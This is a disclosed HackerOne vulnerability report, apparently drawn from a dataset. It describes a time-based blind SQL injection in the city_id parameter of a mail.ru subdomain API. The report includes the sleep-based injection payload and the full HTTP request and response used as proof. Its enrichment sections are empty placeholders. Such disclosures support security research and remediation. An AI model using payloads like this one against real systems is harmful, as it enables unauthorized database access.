---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '786044'
original_report_id: '786044'
title: '[windows10.hi-tech.mail.ru]  Blind SQL Injection'
weakness: SQL Injection
team_handle: mailru
created_at: '2020-01-30T10:14:07.534Z'
disclosed_at: '2020-03-10T16:02:24.522Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 330
asset_identifier: Ext. A Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- sql-injection
---

# [windows10.hi-tech.mail.ru]  Blind SQL Injection

## Metadata

- HackerOne Report ID: 786044
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2020-03-10T16:02:24.522Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Доброе утро!
Сегодня удалось найти у вас слепую скулю, правда она снова вне скопа походу((

URL:
```
https://windows10.hi-tech.mail.ru/api/tweets?city_id=(select(0)from(select(sleep(25)))v)
```

Request:
```
GET /api/tweets?city_id=(select(0)from(select(sleep(25)))v) HTTP/1.1
Host: windows10.hi-tech.mail.ru
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: V████████
Connection: close
Upgrade-Insecure-Requests: 1
```

Response:
```
HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Thu, 30 Jan 2020 10:05:07 GMT
Content-Type: text/json; charset=utf-8
Connection: close
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 50

{"status":"ok","last_id":0,"data":[],"total":"0"}
```
Proof in screenshots.
Для воспроизведения - изменяйте временной промежуток. В запросе выше это 25.

## Impact

Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
